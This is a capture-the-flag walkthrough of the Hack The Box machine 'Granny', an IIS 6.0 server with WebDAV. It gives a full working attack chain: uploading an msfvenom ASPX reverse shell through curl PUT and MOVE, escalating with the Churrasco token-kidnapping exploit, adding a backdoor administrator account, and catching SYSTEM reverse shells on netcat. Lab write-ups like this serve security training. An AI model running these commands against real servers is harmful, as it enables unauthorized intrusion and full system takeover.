# Hack The Box - Granny Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.15 -Pn                                 
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-03 00:57 EST
Nmap scan report for 10.10.10.15
Host is up (0.37s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Fri, 03 Feb 2023 05:58:30 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
|_http-server-header: Microsoft-IIS/6.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.25 seconds
```

We get back the following result showing that only 1 port was open:
- Port `80`: running `Microsoft IIS httpd 6.0`.

Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ rustscan -a 10.10.10.15 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.15:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 80 10.10.10.15

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-03 01:01 EST
Initiating Ping Scan at 01:01
Scanning 10.10.10.15 [2 ports]
Completed Ping Scan at 01:01, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:01
Completed Parallel DNS resolution of 1 host. at 01:01, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:01
Scanning 10.10.10.15 [1 port]
Discovered open port 80/tcp on 10.10.10.15
Completed Connect Scan at 01:01, 0.32s elapsed (1 total ports)
Nmap scan report for 10.10.10.15
Host is up, received syn-ack (0.24s latency).
Scanned at 2023-02-03 01:01:24 EST for 0s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

Since, the version of `Microsoft IIS httpd` was too old, I decided to run `Nikto`, to check if there were any known kernel vulnerabilities in the version 6.0.

```

```

## Enumeration
While the `Nikto` scan was running I visited the web application in the browser.

gran-1

I looked for hidden message or button or some information and looked at the source-code too, but there was nothing. So, I decided to run `Gobuster` to enumerate directories.

```

```

On looking the directories that `gobuster` found, both `/images` and `/_private` were empty dirs.

So, I had to think about what else could I do. The nmap scan showed that the `HTTP PUT` method is allowed.

This could potentially give us the ability to save files on the web server. Since this is a `Microsoft IIS web server`, the type of files it executes are `ASP` and `ASPX`. So let’s check if we’re allowed to upload these file extensions. Now, as the `nmap` scan found a webDAV enabled web server, I used `davtest`, which is a tool that tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ davtest --url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: K6g0MYZEhXkkaim
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim
********************************************************
 Sending test files
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.jsp
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.php
PUT     cgi     FAIL
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.html
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.pl
PUT     shtml   FAIL
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.cfm
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.txt
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.jhtml
PUT     aspx    FAIL
PUT     asp     FAIL
********************************************************
 Checking for test file execution
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.html
EXEC    pl      FAIL
EXEC    cfm     FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.txt
EXEC    jhtml   FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim
PUT File: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.jsp
PUT File: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.php
PUT File: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.html
PUT File: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.pl
PUT File: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.cfm
PUT File: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.txt
PUT File: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.jhtml
Executes: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.html
Executes: http://10.10.10.15/DavTestDir_K6g0MYZEhXkkaim/davtest_K6g0MYZEhXkkaim.txt
```

Now, on looking at the results, both `ASP` and `ASPX` are not allowed. However, `TXT` and `HTML` files are. Remember that the `PUT HTTP` method was not the only method that was allowed. We also can use the `MOVE` method. The `MOVE` method not only can be used to change file locations on the web server, but it can also be used to rename files. So, I decided to try and upload an `HTML` file on the web server and then rename it to change the extension to an `ASPX` file.

So, I created a `test.html` file and used cURL to upload the file to the webpage.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ cat test.html                     
<h1>hello</h1>
```

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl -X PUT http://10.10.10.15/test.html -d @test.html

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl http://10.10.10.15/test.html   
<h1>hello</h1> 
```

Now, that I know that the file was uploaded correctly, I had to change its extenstion from `.html` to `.aspx`

I used `-X MOVE` and `--header` flags in cURL to change the header of the file

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl -X MOVE --header 'Destination:http://10.10.10.15/test.aspx' 'http://10.10.10.15/test.html'                                                        
                                                                                                                                                        
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl http://10.10.10.15/test.aspx
<h1>hello</h1>                                                               
```

Now, that it was confirmed that I could upload, rename, and execute the `ASPX` code on the web server.

## Initial Foothold

I used `msfvenom` to generate an `ASPX` reverse shell.

```
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=IP LPORT=7777 -o shell.aspx
```

Renamed the file to `shell.txt` so that I could upload it on the server.

```
mv shell.aspx shell.txt
```

Then uploaded the file on the webserver and changed its extenstion to `ASPX`
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt
                                                                                                                                                           
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt'
```

Now, all I needed to do is execute the file by visiting the website or by using `cURL`. Before that, i turned on my netcat listener to listen to incoming request.

```
curl http://10.10.10.15/shell.aspx
```

Once I hit **Enter**, I got back a shell

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.15] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
```

Now there was a user `Lakis` directory inside `Document and Settings`, but I  did not have the permissions to visit it.

## Privilege Escalation

I decided to use `Windows Exploit Suggester` to identify any missing patches on the Windows target machine that could potentially allow us to escalate privileges.

You can clone the script from here.
```
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```

Next up is installing dependencies specified in the readme document.

```
pip install xlrd --upgrade
```

Update the database.

```
./windows-exploit-suggester.py --update
```

This creates an excel spreadsheet from the Microsoft vulnerability database in the working directory.

The next step is to retrieve the system information from the target machine. This can be done using the `systeminfo` command.

Copy the output and save it in the file `systeminfo.txt` on the attack machine. Then run the following command.

```
./windows-exploit-suggester.py --database 2020-02-17-mssb.xls --systeminfo ../../HackTheBox/Windows-boxes/Granny/systeminfo.txt
```

It outputs many vulnerabilities. I tried several of them, but none of them worked except for the `Microsoft Windows Server 2003 — Token Kidnapping Local Privilege Escalation` exploit.

Grab the executable from [here](https://github.com/Re4son/Churrasco) and transfer it to the attack machine in the same way we transferred the reverse shell.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ cp churrasco.exe churrasco.txt       

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl -X PUT http://10.10.10.15/churrasco.txt --data-binary @churrasco.txt               

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl -X MOVE --header 'Destination:http://10.10.10.15/churrasco.exe' 'http://10.10.10.15/churrasco.txt'

```

Once uploaded, move to `C:\Inetpub\wwwroot` directory and you can see a `churrasco.exe` file.

```
C:\Inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\Inetpub\wwwroot

02/03/2023  09:01 AM    <DIR>          .
02/03/2023  09:01 AM    <DIR>          ..
04/12/2017  04:17 PM    <DIR>          aspnet_client
02/03/2023  09:01 AM            31,232 churrasco.exe
02/03/2023  08:20 AM    <DIR>          DavTestDir_K6g0MYZEhXkkaim
02/21/2003  05:48 PM             1,433 iisstart.htm
04/12/2017  04:17 PM    <DIR>          images
02/21/2003  05:48 PM             2,806 pagerror.gif
04/12/2017  04:17 PM             2,440 postinfo.html
02/03/2023  08:39 AM             2,727 shell.aspx
02/03/2023  08:27 AM                14 test.aspx
04/12/2017  04:17 PM    <DIR>          _private
04/12/2017  04:17 PM             1,754 _vti_inf.html
04/12/2017  04:17 PM    <DIR>          _vti_log
               8 File(s)         73,638 bytes
               7 Dir(s)   1,307,107,328 bytes free

```

Then, all you need to do is execute the `churrasco.exe` file in the following  manner

```
C:\Inetpub\wwwroot>churrasco.exe "whoami"
churrasco.exe "whoami"
nt authority\system

```

And you can see that we have root permissions.

I decided to add a user on the system that is part of the Administrators group.

```
churrasco.exe "net user test test /add && net localgroup Administrators test /add"
```

```
C:\Inetpub\wwwroot>churrasco.exe "net user test test /add && net localgroup Administrators test /add"
churrasco.exe "net user test test /add && net localgroup Administrators test /add"
The command completed successfully.

The command completed successfully.


C:\Inetpub\wwwroot>net user test
net user test
User name                    test
Full Name                    
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/3/2023 9:05 AM
Password expires             3/18/2023 7:53 AM
Password changeable          2/3/2023 9:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.
```

Now, that I know I can use `churrasco.exe` to run as `nt authority\system`, I can upload a reverse shell and retrieve root shell

Use `msfvenom` to generate the payload
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9999 -a x86 --platform windows -f exe -o privesc.exe.txt
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: privesc.exe.txt
```

Using `cURL` to transfer files
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl -X PUT http://10.10.10.15/privesc.exe.txt --data-binary @privesc.exe.txt


┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ curl -X MOVE --header 'Destination:http://10.10.10.15/privesc.exe' 'http://10.10.10.15/privesc.exe.txt' 

```

And then ran the `privesc.exe` using the `churrasco.exe`

```
C:\Inetpub\wwwroot>.\churrasco.exe -d "C:\Inetpub\wwwroot\privesc.exe"
.\churrasco.exe -d "C:\Inetpub\wwwroot\privesc.exe"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

And I got a `root` shell
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Granny]
└─$ nc -lvnp 9999       
listening on [any] 9999 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.15] 1031
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```


Retriving the `user` flag
```
C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
[REDACTED]
```

Retriving the `root` flag
```
C:\Documents and Settings>cd Administrator\Desktop
cd Administrator\Desktop

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
[REDACTED]
```

